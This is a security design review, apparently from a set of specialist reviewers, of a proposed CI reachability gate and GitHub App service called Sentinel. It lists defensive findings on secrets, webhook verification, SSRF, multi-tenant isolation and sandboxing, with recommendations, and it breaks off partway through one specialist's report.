# Security Fleet Assessment

## Request

> # Continuous Reachability Gate: diff-aware source→sink gating (entrygraph gate + Sentinel GitHub App)
> 
> ## Overview
> 
> Today `entrygraph` answers a powerful one-shot question — *"can any entrypoint reach a
> dangerous sink right now?"* — but it has **no memory across commits**. Teams can run
> `entrygraph paths` locally, but there is no way to say *"this PR just introduced a **new**
> route → `subprocess.run` path that didn't exist on `main`"* and block it before merge.
> 
> This issue proposes the **Continuous Reachability Gate**: diff-aware reachability that turns
> entrygraph's risk-ranked source→sink analysis into an enforcement point in CI. It ships in two
> layers:
> 
> 1. **`entrygraph gate`** — a new CLI verb that indexes the current checkout, computes its set of
>    reachable dangerous paths, diffs them against a stored **baseline**, and exits non-zero when a
>    PR introduces new paths above a risk threshold. Zero infrastructure; drop it into any CI.
> 2. **Sentinel** — an optional self-hostable **GitHub App + HTTP service** that receives PR
>    webhooks, runs the gate on the head commit, maintains per-repo baselines, records findings, and
>    posts a GitHub **Check Run** with the new/known/suppressed breakdown. It also exports **SARIF**
>    so findings surface in GitHub code scanning.
> 
> The core insight that makes this feasible: entrygraph **never executes code**, so analyzing an
> untrusted PR is fundamentally a parse-and-query operation, not a sandbox-escape problem — a strong
> security posture for a CI gate.
> 
> ### Why this adds real value
> 
> - **Shifts reachability left.** A finding is only actionable if it blocks the change that caused
>   it. Baseline diffing converts a static report into a merge gate.
> - **Kills alert fatigue.** Instead of re-reporting 200 pre-existing paths on every PR, the gate
>   reports only what *this diff* introduced.
> - **Turns entrygraph into a product surface** (GitHub App + API) without abandoning the
>   library/CLI ethos.
> 
> ## Goals
> 
> - Stable, line-independent **path fingerprints** so a path is "the same finding" across commits
>   even after refactors that move code.
> - `entrygraph gate --base <ref> --head <ref>` returns new/known/fixed/suppressed path sets and a
>   CI-friendly exit code.
> - Baseline create/update/inspect via CLI; automatic baseline refresh on merge to the default branch.
> - Sentinel service: GitHub App webhook → scan → Check Run + SARIF, multi-repo, self-hostable.
> - Per-repo policy: risk threshold, gated sink categories, warn-only mode, suppression list.
> 
> ## Non-Goals
> 
> - Not building a hosted multi-tenant SaaS in this issue (Sentinel is **self-hostable**; SaaS
>   hardening is future work).
> - No new language/framework extractors — this reuses the existing graph + reachability engine.
> - Not replacing SAST tools; this gates on entrygraph's heuristic taint tier only.
> 
> ## Architecture
> 
> ```mermaid
> flowchart LR
>     subgraph dev["Developer / CI"]
>         PR["Pull Request"]
>         GHA["GitHub Action:\nentrygraph gate"]
>     end
> 
>     subgraph core["entrygraph core (reused)"]
>         IDX["index\n(tree-sitter -> SQLite)"]
>         REACH["reachability\nsource -> sink paths"]
>         FP["fingerprint\nstable path IDs"]
>     end
> 
>     subgraph gate["Gate engine (new)"]
>         DIFF["baseline diff\nnew / known / fixed"]
>         POL["policy\nthreshold + categories"]
>     end
> 
>     subgraph sentinel["Sentinel service (new, optional)"]
>         WH["Webhook receiver\nHMAC verify"]
>         Q["Job queue"]
>         WK["Scan worker"]
>         API["REST API"]
>         STORE[("Postgres\nbaselines + findings")]
>         CHK["GitHub Check Run\n+ SARIF"]
>     end
> 
>     PR --> GHA --> IDX --> REACH --> FP --> DIFF
>     POL --> DIFF
>     DIFF -->|exit code| GHA
> 
>     PR -.webhook.-> WH --> Q --> WK
>     WK --> IDX
>     WK --> DIFF
>     DIFF --> STORE
>     WK --> CHK
>     API --> STORE
> ```
> 
> ### PR gate sequence (Sentinel path)
> 
> ```mermaid
> sequenceDiagram
>     participant GH as GitHub
>     participant WH as Webhook receiver
>     participant WK as Scan worker
>     participant EG as entrygraph core
>     participant DB as Postgres
> 
>     GH->>WH: pull_request (opened/synchronize) + X-Hub-Signature-256
>     WH->>WH: verify HMAC, dedupe delivery id
>     WH->>WK: enqueue(scan, installation, repo, head_sha, base_sha)
>     WK->>GH: fetch head + base via installation token
>     WK->>EG: index(head) -> reachable paths
>     WK->>EG: fingerprint(paths)
>     WK->>DB: load baseline(repo, base branch)
>     WK->>WK: diff -> new / known / fixed, apply policy
>     WK->>DB: persist ScanRun + Findings
>     WK->>GH: create Check Run (pass/fail) + upload SARIF
> ```
> 
> ## Data models
> 
> Reuses the existing per-scan SQLite graph (`Symbol`/`Edge`/`Entrypoint`) unchanged. Adds a
> **findings store** (SQLite for the CLI; Postgres for Sentinel) with these SQLAlchemy 2.0 tables,
> following the repo's existing `Mapped`/`mapped_column` style.
> 
> ### Path fingerprint (the keystone)
> 
> A path's identity must survive line moves and cosmetic refactors. The fingerprint is a
> `blake2b` hash over the **semantic** shape of the path, deliberately excluding line numbers:
> 
> ```
> fingerprint = blake2b(
>     source_category ,          # e.g. "http_route"
>     sink_id ,                  # e.g. "py.command-exec.subprocess"
>     tuple(symbol.qname for symbol in path.hops) ,   # ordered qnames, not lines
>     normalized=True            # externals collapsed to "py:subprocess.run"
> )
> ```
> 
> Two fingerprint *variants* are stored: `strict` (full ordered qname chain) and `endpoint`
> (source entrypoint + sink only). Diffing prefers `strict`; `endpoint` provides fuzzy matching so a
> mid-path refactor doesn't masquerade as a brand-new finding.
> 
> ### New tables
> 
> ```python
> class Baseline(Base):
>     __tablename__ = "baselines"
>     id: Mapped[int] = mapped_column(primary_key=True)
>     repo_id: Mapped[int] = mapped_column(ForeignKey("repositories.id", ondelete="CASCADE"))
>     branch: Mapped[str] = mapped_column(String(255))          # default branch, usually "main"
>     commit_sha: Mapped[str] = mapped_column(String(40))       # commit the baseline was cut from
>     created_at: Mapped[datetime]
>     path_count: Mapped[int] = mapped_column(default=0)
>     # accepted fingerprints live in `Finding` rows referencing this baseline
> 
> class ScanRun(Base):
>     __tablename__ = "scan_runs"
>     id: Mapped[int] = mapped_column(primary_key=True)
>     repo_id: Mapped[int] = mapped_column(ForeignKey("repositories.id", ondelete="CASCADE"))
>     pr_number: Mapped[int | None]
>     head_sha: Mapped[str] = mapped_column(String(40))
>     base_sha: Mapped[str | None] = mapped_column(String(40))
>     status: Mapped[str] = mapped_column(String(16))           # queued|running|passed|failed|error
>     new_count: Mapped[int] = mapped_column(default=0)
>     known_count: Mapped[int] = mapped_column(default=0)
>     fixed_count: Mapped[int] = mapped_column(default=0)
>     suppressed_count: Mapped[int] = mapped_column(default=0)
>     duration_ms: Mapped[int | None]
>     created_at: Mapped[datetime]
> 
> class Finding(Base):
>     __tablename__ = "findings"
>     id: Mapped[int] = mapped_column(primary_key=True)
>     scan_run_id: Mapped[int] = mapped_column(ForeignKey("scan_runs.id", ondelete="CASCADE"))
>     fingerprint: Mapped[str] = mapped_column(String(32), index=True)   # blake2b-128 hex, strict
>     endpoint_fingerprint: Mapped[str] = mapped_column(String(32), index=True)
>     source_category: Mapped[str] = mapped_column(String(48))
>     sink_id: Mapped[str] = mapped_column(String(64))
>     risk: Mapped[float]                                      # entrygraph path risk score
>     status: Mapped[str] = mapped_column(String(12))          # new|known|fixed|suppressed
>     path_json: Mapped[str] = mapped_column(Text)             # rendered hops for the report/SARIF
> 
> class Suppression(Base):
>     __tablename__ = "suppressions"
>     id: Mapped[int] = mapped_column(primary_key=True)
>     repo_id: Mapped[int] = mapped_column(ForeignKey("repositories.id", ondelete="CASCADE"))
>     fingerprint: Mapped[str] = mapped_column(String(32), index=True)
>     reason: Mapped[str] = mapped_column(Text)
>     created_by: Mapped[str] = mapped_column(String(255))
>     expires_at: Mapped[datetime | None]                     # optional TTL so waivers don't rot
> 
> class RepoPolicy(Base):
>     __tablename__ = "repo_policies"
>     repo_id: Mapped[int] = mapped_column(ForeignKey("repositories.id"), primary_key=True)
>     risk_threshold: Mapped[float] = mapped_column(default=0.5)   # gate paths at/above this
>     gated_categories: Mapped[str] = mapped_column(Text)         # JSON list of sink categories
>     mode: Mapped[str] = mapped_column(String(8), default="block")  # block|warn
>     min_confidence: Mapped[str] = mapped_column(String(12), default="fuzzy")
> ```
> 
> Sentinel-only (multi-repo GitHub App):
> 
> ```python
> class Installation(Base):
>     __tablename__ = "installations"
>     id: Mapped[int] = mapped_column(primary_key=True)        # GitHub installation id
>     account_login: Mapped[str] = mapped_column(String(255))
>     created_at: Mapped[datetime]
>     suspended: Mapped[bool] = mapped_column(default=False)
> ```
> 
> ### API models (Pydantic, Sentinel REST)
> 
> ```python
> class GateResult(BaseModel):
>     scan_id: int
>     head_sha: str
>     passed: bool
>     mode: Literal["block", "warn"]
>     new: list[FindingOut]
>     known: list[FindingOut]
>     fixed: list[FindingOut]
>     suppressed: list[FindingOut]
> 
> class FindingOut(BaseModel):
>     fingerprint: str
>     source_category: str
>     sink_id: str
>     risk: float
>     confidence: Literal["exact", "import", "fuzzy", "unresolved"]
>     hops: list[HopOut]
> ```
> 
> ## Component responsibilities
> 
> | Component | Responsibility |
> | --- | --- |
> | `graph/fingerprint.py` (new) | Deterministic `strict` + `endpoint` path fingerprints. |
> | `gate/engine.py` (new) | Load baseline, diff fingerprint sets, apply `RepoPolicy`, compute exit code. |
> | `gate/store.py` (new) | SQLAlchemy findings store (SQLite for CLI, Postgres for Sentinel). |
> | `cli/main.py` (extend) | `entrygraph gate`, `entrygraph baseline {update,show}`, `--sarif`. |
> | `sentinel/webhook.py` (new) | HMAC-verified receiver, delivery-id dedupe, enqueue. |
> | `sentinel/worker.py` (new) | Fetch via installation token, run gate, persist, post Check Run + SARIF. |
> | `sentinel/api.py` (new) | REST: scans, findings, suppressions, policy. |
> | `sentinel/github.py` (new) | App JWT → installation token, Check Runs, SARIF upload. |
> 
> ## Tech stack
> 
> - **Reused core:** existing entrygraph engine — `tree-sitter` / `tree-sitter-language-pack`
>   (parsing), `SQLAlchemy 2.0` (ORM), the reachability/scoring modules. **No code execution.**
> - **Fingerprinting & diff:** `hashlib.blake2b` (stdlib), pure-Python set diff.
> - **CLI:** existing `rich`-based CLI; new verbs; SARIF via a small serializer (stdlib `json`).
> - **Sentinel service:** `FastAPI` + `uvicorn` (webhook + REST); `arq` + `Redis` for the async job
>   queue and worker; `PostgreSQL` via SQLAlchemy for the multi-repo findings store; `httpx` +
>   `PyJWT` for GitHub App auth (App JWT → installation tokens); git fetch via `dulwich` (pure
>   Python, no shelling out) or a constrained `git` invocation.
> - **Packaging/deploy:** `Docker` image for Sentinel; `hatch-vcs` versioning (already in place);
>   the CLI gate ships in the existing wheel with the service deps behind an optional
>   `entrygraph[sentinel]` extra.
> - **CI integration:** a thin composite **GitHub Action** wrapping `entrygraph gate`; **SARIF 2.1.0**
>   output for GitHub code scanning.
> 
> ## Risks & mitigations
> 
> | Risk | Impact | Mitigation |
> | --- | --- | --- |
> | **Analyzing untrusted PR code** | A hostile repo could try to exhaust resources during parse. | entrygraph never executes code; enforce per-file size caps, total time budget, max-nodes limits, and run the worker in a locked-down container (read-only FS, no network egress except the git fetch). |
> | **Webhook forgery / replay** | Spoofed events trigger scans or poison results. | Verify `X-Hub-Signature-256` HMAC with the app webhook secret; dedupe on `X-GitHub-Delivery`; reject events outside the installation's repo set. |
> | **GitHub App private key & webhook secret exposure** | Full impersonation of the app across all installs. | Secrets from env/secret manager only, never in the DB or logs; short-lived installation tokens; key rotation runbook; scope tokens to the minimum permissions (`contents:read`, `checks:write`, `pull_requests:read`). |
> | **SSRF / arbitrary repo fetch** | Worker could be coerced into fetching internal URLs. | Only fetch repos the installation grants, using the installation token and GitHub's clone URL — never a user-supplied URL; deny-list internal CIDRs at the egress proxy. |
> | **Multi-tenant data leakage (Sentinel)** | One org's code graph / findings visible to another. | Every query scoped by `installation_id` / `repo_id`; row-level authorization checks; per-install encryption-at-rest option; hard delete of graphs + findings on app uninstall. |
> | **Fingerprint instability** | Refactors flagged as "new," eroding trust and blocking good PRs. | Line-independent `strict` fingerprint plus `endpoint` fuzzy fallback; a "moved, not new" reconciliation pass; golden-repo regression tests asserting stable fingerprints across known refactors. |
> | **False positives blocking merges** | Heuristic taint gate stops legitimate work. | `warn` mode default for first N days; `risk_threshold` + `min_confidence` policy; time-boxed suppressions with required reason; never gate `unresolved`-only paths. |
> | **Storing customer source graphs** | Privacy/compliance exposure (source is sensitive IP). | Store the graph/findings, not raw source; configurable retention + purge; documented data-handling; SOC 2 / GDPR posture for any hosted deployment. |
> | **Supply-chain risk in new deps** | FastAPI/arq/dulwich/PyJWT expand the attack surface. | Pin + hash-lock via `uv`; keep service deps behind the `sentinel` extra so the core CLI stays lean; Dependabot + SBOM. |
> | **Baseline poisoning** | A malicious PR quietly accepts a dangerous path into the baseline. | Baselines only refresh from the protected default branch after merge; suppressions require review via CODEOWNERS on a checked-in policy file. |
> 
> ## Milestones
> 
> 1. **Fingerprinting** — `strict` + `endpoint` fingerprints with golden-repo stability tests.
> 2. **`entrygraph gate` CLI** — baseline store, diff engine, policy, exit codes, `--sarif`.
> 3. **GitHub Action** — composite action + docs for zero-infra adoption.
> 4. **Sentinel MVP** — webhook receiver, worker, Postgres store, Check Run posting.
> 5. **Sentinel API + policy UI hooks** — REST for scans/findings/suppressions/policy.
> 6. **Hardening** — sandboxing, secret rotation runbook, multi-tenant authz, retention.
> 
> ## Acceptance criteria
> 
> - A PR that adds a new `http_route → command_exec` path fails `entrygraph gate` while a PR that
>   only touches unrelated code passes.
> - Re-indenting or moving a reachable function does **not** produce a new finding.
> - Fixing (removing) a path reports it as `fixed` and drops it from the baseline on merge.
> - Sentinel posts a Check Run whose summary matches the CLI's new/known/fixed/suppressed counts, and
>   the same findings appear in GitHub code scanning via SARIF.
> - The scan worker rejects an unsigned/replayed webhook and refuses to fetch a repo outside the
>   installation.

## Executive Summary

The Continuous Reachability Gate represents a high-value security tool with a well-considered core design—parsing untrusted PR code without execution is a strong foundation. However, the architecture introduces critical attack surface around GitHub App credential management, webhook processing, multi-tenant data isolation, and untrusted repository analysis that demands immediate hardening. Most concerning: the Sentinel REST API has no specified authentication model (creating open data exposure), GitHub App private key management lacks operational detail (single point of total compromise), and multi-tenant isolation relies solely on application-layer enforcement without defense-in-depth. While the proposal acknowledges many risks and suggests mitigations, several lack implementation specificity—particularly around worker sandboxing, git fetch SSRF prevention, supply chain integrity (Docker images, GitHub Action), and audit logging. The tool's positioning as a merge gate amplifies risk: compromise here could systematically bypass the very protections it enforces across all installations.

### Top Risks

1. GitHub App private key theft or exposure enables persistent cross-installation impersonation and is a single point of total compromise with underspecified storage, rotation, and incident response procedures
2. Sentinel REST API lacks any authentication or authorization mechanism, creating open exposure of cross-organization findings, suppressions, and policy data
3. Multi-tenant data isolation depends entirely on application-layer query scoping (repo_id/installation_id filtering) without database-level row security or architectural isolation, enabling authorization bypass via SQL injection or logic flaws
4. Command injection and SSRF vulnerabilities in git fetch operations if repository URLs are not strictly validated and subprocess invocations are not hardened
5. Webhook HMAC verification vulnerable to timing attacks, algorithm confusion in JWT validation, and replay attacks with unbounded deduplication windows—enabling forged events and baseline poisoning
6. Worker sandbox lacks defense-in-depth specifications: resource limits (CPU, memory, file size, parsing time), seccomp profiles, network egress controls, and read-only filesystem enforcement are mentioned but not detailed
7. Baseline poisoning via race conditions (TOCTOU in pull_request webhook handling) or pre-gate merges allows persistent dangerous paths to be accepted without detection
8. Supply chain compromise of Sentinel Docker image (no signing/provenance), GitHub Action (no integrity controls), or new runtime dependencies (FastAPI, arq, dulwich, PyJWT) could systematically bypass detections across all users
9. Resource exhaustion attacks via malicious PR content exploiting parser algorithmic complexity or unbounded graph growth with underspecified per-file size caps and total node limits
10. Comprehensive audit logging missing for security-critical events: suppression creation, baseline updates, policy changes, credential access, and multi-tenant authorization failures

### Cross-Cutting Themes

- GitHub App private key and webhook secret management—storage, rotation, incident response—raised as critical gaps by Product, AppSec, Supply Chain, Threat Model, Cloud, IAM, Pentest, and Security Architect specialists
- Multi-tenant data isolation relying on application-layer enforcement without defense-in-depth safeguards identified by AppSec, Threat Model, Cloud, IAM, and Security Architect
- Webhook HMAC verification vulnerabilities (timing attacks, replay protection, secret exposure) flagged by AppSec, Threat Model, and Pentest engineers
- Untrusted PR code parsing resource exhaustion and sandbox hardening gaps noted by Product, AppSec, Supply Chain, Threat Model, Cloud, Pentest, and Security Architect
- Git fetch SSRF and command injection risks highlighted by Product, AppSec, Threat Model, Cloud, and Pentest specialists
- Missing comprehensive audit logging for security events and compliance raised by Product, Cloud, and Security Architect engineers
- REST API authentication and authorization model undefined, creating open data exposure per Product, IAM, and Security Architect assessments

### Recommended Next Steps

1. Define and implement Sentinel REST API authentication (mutual TLS, API keys, or OAuth) and authorization model with per-installation/repo scoping before any deployment
2. Specify GitHub App private key infrastructure: HSM or managed secret storage, automated rotation procedure, key compromise incident response playbook, and strict access controls preventing log/error exposure
3. Harden git fetch operations: validate clone URLs against allowlist of GitHub domains, use library API (dulwich) instead of shell invocation, apply SSRF protection via egress proxy with internal CIDR deny-list, and enforce strict subprocess sandboxing if git binary is required
4. Implement defense-in-depth worker sandboxing with concrete specifications: seccomp profiles allowing only necessary syscalls, cgroup resource limits (CPU/memory/time), read-only root filesystem, no network egress except authenticated GitHub API, and per-scan file size and graph node caps
5. Design comprehensive audit logging capturing all security-critical events: webhook receipt/rejection, scan invocation, baseline updates, suppression creation/expiration, policy changes, authentication failures, authorization denials, and secret access—with immutable storage and alerting
6. Refactor multi-tenant isolation with database-level row security policies, separate schema/database per installation option for high-sensitivity deployments, and architectural enforcement (middleware) ensuring repo_id/installation_id cannot be bypassed via SQL injection or ORM misuse
7. Implement constant-time HMAC comparison, bounded deduplication window (e.g., 5 minutes) with TTL on delivery IDs, JWT signature algorithm pinning (reject 'none' and 'HS256'), and structured baseline update workflow that only accepts changes from protected branch post-merge hooks
8. Establish Docker image and GitHub Action supply chain integrity: sign container images with Cosign/Notary, publish SLSA provenance attestations, implement reproducible builds, pin GitHub Action to commit SHA (not tag), and publish SBOM for all distribution artifacts
9. Create dependency security strategy: define CVE response SLA, maintain software bill of materials, establish weekly vulnerability scanning, document supply chain vetting criteria (e.g., OSSF scorecard thresholds), and implement hash-locked pinning via uv with automated Dependabot updates
10. Define baseline protection mechanism preventing TOCTOU races: baseline updates only via protected branch webhook after successful merge, require approval workflow (CODEOWNERS) for suppression and policy changes, and implement fingerprint stability regression tests across known refactoring patterns

## Specialists Engaged

| Role | Priority | Rationale |
| --- | --- | --- |
| Product Security Engineer | primary | Core secure-SDLC review for a new product surface (GitHub App + webhook service + multi-tenant store) that handles untrusted PR code. Must review authentication flows (webhook HMAC, App JWT, installation tokens), authorization boundaries (per-repo/install scoping), and abuse scenarios (malicious repos, resource exhaustion). |
| Application Security Engineer | primary | Application-level security for the FastAPI service and API: input validation on webhook payloads, SQL injection risks in SQLAlchemy queries, API authorization checks, SSRF prevention in repo fetching, and secure handling of untrusted graph data. |
| Supply Chain Security Engineer | primary | Introduces critical new dependencies (FastAPI, arq, dulwich, PyJWT, httpx) into a security tool that will run in CI and handle customer code. Must review dependency trustworthiness, pinning strategy, SBOM generation, and the attack surface expansion from optional [sentinel] extras. |
| Threat Model Engineer | primary | Complex multi-boundary system (GitHub webhooks → Sentinel service → worker → database → GitHub API) with multiple threat actors (malicious repo owners, spoofed webhooks, SSRF attempts, multi-tenant isolation breaches). Needs STRIDE enumeration of the webhook/worker/store/API surfaces. |
| Cloud Security Engineer | primary | Container security for the Sentinel worker (sandboxing untrusted parse operations, read-only FS, egress controls), secrets management (App private key, webhook secret, DB credentials), and cloud IAM if deployed to AWS/GCP. Critical for the 'never execute code' security posture. |
| IAM Engineer | supporting | GitHub App permission scoping (contents:read, checks:write, pull_requests:read), installation token lifecycle, API authorization logic (per-repo/install queries), and suppression approval workflows. The least-privilege model here is foundational to multi-tenant safety. |
| Penetration Test Engineer | supporting | Adversarial review of webhook forgery/replay attacks, SSRF via malicious clone URLs, baseline poisoning, fingerprint collision attacks to mask dangerous paths, and multi-tenant data exfiltration. The 'untrusted PR code' threat model demands offensive validation. |
| Security Architect | supporting | System-level design review of trust boundaries (webhook verification → worker sandbox → DB isolation → GitHub API), data flow for customer code graphs, and the decision to store findings vs. raw source. The mermaid diagrams warrant architectural scrutiny. |
| Incident Response / DFIR Engineer | supporting | IR readiness for a service that handles customer code: logging strategy for abuse detection (repeated scan failures, SSRF attempts, data access anomalies), containment plan if the App key is compromised, and forensics/audit trail for the findings store. |

## Consolidated Findings

| Severity | Finding | Role |
| --- | --- | --- |
| critical | Command injection risk in git fetch operations | Application Security Engineer |
| critical | JWT algorithm confusion enables authentication bypass | Application Security Engineer |
| critical | GitHub App private key and webhook secret management underspecified | Supply Chain Security Engineer |
| critical | Multi-tenant installation_id/repo_id authorization bypass in REST API | Threat Model Engineer |
| critical | Sentinel REST API lacks authentication and authorization model | IAM Engineer |
| critical | Webhook HMAC verification bypass or secret compromise enables full app impersonation | Penetration Test Engineer |
| critical | GitHub App private key theft grants persistent cross-installation access | Penetration Test Engineer |
| critical | GitHub App private key is a single point of total compromise | Security Architect |
| high | Sentinel REST API authentication mechanism not specified | Product Security Engineer |
| high | No audit trail for suppression creation, baseline updates, or policy changes | Product Security Engineer |
| high | Resource exhaustion mitigations for untrusted code parsing are underspecified | Product Security Engineer |
| high | Git fetch mechanism may allow SSRF or arbitrary command injection | Product Security Engineer |
| high | Webhook HMAC verification vulnerable to timing attacks | Application Security Engineer |
| high | SSRF via malicious git repository URLs | Application Security Engineer |
| high | Broken access control: missing row-level repo_id authorization | Application Security Engineer |
| high | Sensitive data exposure: private key and webhook secret in logs/errors | Application Security Engineer |
| high | Sentinel Docker image lacks signing and provenance attestation | Supply Chain Security Engineer |
| high | GitHub Action supply chain security not addressed | Supply Chain Security Engineer |
| high | Dependency vetting and vulnerability management strategy insufficient | Supply Chain Security Engineer |
| high | Baseline poisoning via pull_request webhook race condition | Threat Model Engineer |
| high | GitHub App private key and webhook secret stored in environment risk exposure via logs or error traces | Threat Model Engineer |
| high | Webhook HMAC verification vulnerable to timing attack and replay | Threat Model Engineer |
| high | SQL injection in findings queries if fingerprint or path_json are unsanitized | Threat Model Engineer |
| high | GitHub App Private Key Storage and Rotation Mechanism Unspecified | Cloud Security Engineer |
| high | Insufficient Container Isolation and Resource Limits for Untrusted Code Analysis | Cloud Security Engineer |
| high | Multi-Tenant Data Isolation Relies on Application-Layer Enforcement Without Defense-in-Depth | Cloud Security Engineer |
| high | Suppression creation bypasses approval workflow and lacks ABAC controls | IAM Engineer |
| high | GitHub App private key rotation runbook not defined | IAM Engineer |
| high | Malicious PR content triggers resource exhaustion via parsing complexity attacks | Penetration Test Engineer |
| high | Multi-tenant SQL injection or authorization bypass leaks cross-organization findings | Penetration Test Engineer |
| high | SSRF via git clone of attacker-controlled URLs fetches internal resources | Penetration Test Engineer |
| high | Baseline poisoning allows persistent backdoor via race condition or pre-gate merge | Penetration Test Engineer |
| high | Worker parsing untrusted PR code lacks defense-in-depth sandboxing | Security Architect |
| high | Multi-tenant data isolation relies solely on application-layer enforcement | Security Architect |
| high | API authentication and authorization scheme is unspecified | Security Architect |
| medium | Webhook replay protection relies on X-GitHub-Delivery deduplication without TTL | Product Security Engineer |
| medium | GitHub App private key rotation procedure is not defined | Product Security Engineer |
| medium | Multi-tenant authorization enforcement relies on query scoping without architectural safeguards | Product Security Engineer |
| medium | Suppression and policy changes lack CODEOWNERS or approval workflow | Product Security Engineer |
| medium | Secrets may be logged in error messages or scan output | Product Security Engineer |
| medium | Path traversal in fingerprint or file path handling | Application Security Engineer |
| medium | SQL injection via insufficient ORM usage or raw queries | Application Security Engineer |
| medium | Denial of service via unbounded resource consumption during parsing | Application Security Engineer |
| medium | Race condition in baseline update allows check-time-of-use bypass | Application Security Engineer |
| medium | SARIF injection allows code execution in GitHub code scanning UI | Application Security Engineer |
| medium | Dulwich (pure-Python Git library) introduces git protocol parsing attack surface | Supply Chain Security Engineer |
| medium | SBOM generation and publication strategy undefined | Supply Chain Security Engineer |
| medium | Docker base image selection and patching not specified | Supply Chain Security Engineer |
| medium | Redis and PostgreSQL deployment security not addressed | Supply Chain Security Engineer |
| medium | No reproducible build or build provenance for CLI or Docker image | Supply Chain Security Engineer |
| medium | Untrusted PR code analysis resource exhaustion via malicious parse targets | Threat Model Engineer |
| medium | SSRF via repository clone URL manipulation in GitHub App integration | Threat Model Engineer |
| medium | Fingerprint collision or instability undermines gate integrity | Threat Model Engineer |
| medium | Suppression abuse: permanent waivers for critical findings without expiry or review | Threat Model Engineer |
| medium | Redis job queue (arq) lacks authentication and encryption in transit | Threat Model Engineer |
| medium | SSRF Risk in Git Clone Operations with Insufficient URL Validation | Cloud Security Engineer |
| medium | Webhook Replay and Race Condition Vulnerabilities in Deduplication | Cloud Security Engineer |
| medium | Missing Comprehensive Audit Logging for Security Events and Compliance | Cloud Security Engineer |
| medium | Insufficient Network Segmentation and Ingress/Egress Controls | Cloud Security Engineer |
| medium | Lack of Rate Limiting and Anti-Abuse Controls on Webhook Receiver | Cloud Security Engineer |
| medium | Installation tokens not explicitly scoped to minimum necessary permissions | IAM Engineer |
| medium | Worker container isolation relies on unspecified runtime security controls | IAM Engineer |
| medium | Multi-tenant row-level authorization not enforced at database layer | IAM Engineer |
| medium | Baseline poisoning protection assumes merge controls without verification | IAM Engineer |
| medium | Suppression API without strict authorization allows PR authors to bypass their own findings | Penetration Test Engineer |
| medium | Replay attack via missing or unbounded X-GitHub-Delivery deduplication | Penetration Test Engineer |
| medium | Unvalidated repo_id or installation_id from webhook enables scan of unauthorized repos | Penetration Test Engineer |
| medium | Sensitive information disclosure via overly detailed error messages or logs | Penetration Test Engineer |
| medium | Supply chain risk in FastAPI, arq, dulwich, PyJWT, or tree-sitter language packs | Penetration Test Engineer |
| medium | Baseline update mechanism creates a TOCTOU race for baseline poisoning | Security Architect |
| medium | Webhook processing lacks rate limiting and can be weaponized for DoS | Security Architect |
| medium | No audit logging strategy for security-critical actions | Security Architect |
| medium | Fingerprint stability assumption may not hold under refactoring, causing false negatives | Security Architect |
| low | No rate limiting or abuse prevention for webhook or API endpoints | Product Security Engineer |
| low | Webhook endpoint lacks rate limiting and DoS protection | Supply Chain Security Engineer |
| low | Baseline Poisoning Attack Vector Through Unvalidated Automated Updates | Cloud Security Engineer |
| low | Delivery ID deduplication window and storage not specified | IAM Engineer |
| low | Check Run status manipulation causes confusion or bypasses external gates | Penetration Test Engineer |
| low | SARIF upload to GitHub code scanning creates a trust dependency on GitHub's ingestion | Security Architect |

## Specialist Reports

### Product Security Engineer

The Continuous Reachability Gate design introduces a CI gate that analyzes untrusted PR code and a multi-tenant GitHub App service (Sentinel) that handles webhooks, secrets, and cross-repository data. The design acknowledges key risks—untrusted code parsing, webhook forgery, secret exposure, SSRF, multi-tenant isolation—and proposes mitigations, but several critical security controls lack implementation detail. No code execution is a strong baseline, but the attack surface expands significantly with webhook handling, GitHub App token management, multi-tenancy, and external git fetches. High-risk gaps include undefined API authentication, absent audit logging, unclear access control for policy/suppression changes, and unspecified resource limits for parser abuse.

**Confidence:** high

#### [HIGH] Sentinel REST API authentication mechanism not specified

The design introduces a REST API (sentinel/api.py) exposing scans, findings, suppressions, and policy configuration, but does not specify how clients authenticate or how authorization is enforced beyond database-level repo_id scoping. Without authentication, the API is open to anonymous abuse; without proper authorization checks, one tenant could read or modify another tenant's data, suppressions, or policy.

**Likelihood:** High likelihood of exploitation if the API is exposed without authentication. Multi-tenant data leakage is explicitly listed as a risk, yet the API—which is the primary programmatic interface for sensitive operations—has no documented auth model.

**Recommendation:** Define the API authentication scheme before implementation. For a self-hosted service, use API keys scoped to installations/repos, or integrate with the GitHub App's installation tokens (verify the token grants access to the requested repo). Enforce authorization checks on every endpoint: validate that the authenticated principal is permitted to access the requested repo_id. Document the authentication model in the design and add integration tests that confirm unauthorized access is denied.

**References:** OWASP API Security Top 10 - API1:2023 Broken Object Level Authorization, OWASP API Security Top 10 - API2:2023 Broken Authentication, CWE-306: Missing Authentication for Critical Function, CWE-639: Authorization Bypass Through User-Controlled Key

#### [HIGH] No audit trail for suppression creation, baseline updates, or policy changes

Suppressions, baselines, and RepoPolicy records control which findings block merges, but the design does not require or store an audit log of who created/modified/deleted these records and when. An attacker with database access or a compromised account could silently suppress a critical finding or relax the risk_threshold, and the change would be invisible to security reviewers. This undermines accountability and incident response.

**Likelihood:** Medium to high. The risk is elevated in multi-tenant deployments where one compromised installation or insider could manipulate policy/suppressions for their repos, and in the CLI mode where a developer with commit access could tamper with local baseline files.

**Recommendation:** Add audit logging for all security-relevant mutations: Suppression create/delete (with created_by and reason already in the model, but no immutable log), Baseline updates (record the user/service that triggered the refresh and the commit that authorized it), RepoPolicy changes (log old/new values and the actor). Store audit events in a separate append-only table or external log aggregator. Emit structured logs for these events to enable alerting on anomalies (e.g., mass suppression, threshold set to 0). Document that baseline updates only occur after merge to the protected default branch and that manual baseline manipulation via CLI should be restricted by repository write permissions and tracked in git history.

**References:** CWE-778: Insufficient Logging, NIST SP 800-53 AU-2: Audit Events, OWASP ASVS 7.1: Log Content Requirements, MITRE ATT&CK T1562.002: Impair Defenses: Disable or Modify Tools

#### [HIGH] Resource exhaustion mitigations for untrusted code parsing are underspecified

The design states that analyzing untrusted PR code will enforce 'per-file size caps, total time budget, max-nodes limits' and run in a locked-down container, but none of these limits are quantified or architected. An attacker could submit a PR with pathological input (deeply nested expressions, extremely large files, or many files) to exhaust CPU, memory, or disk during tree-sitter parsing or graph construction, causing denial of service for the scan worker or sibling jobs. The absence of concrete limits makes it difficult to validate the defense.

**Likelihood:** High. Public CI/analysis services are routinely targeted with resource-exhaustion attacks. A malicious actor opening PRs against a repository with Sentinel enabled has a direct path to trigger scans.

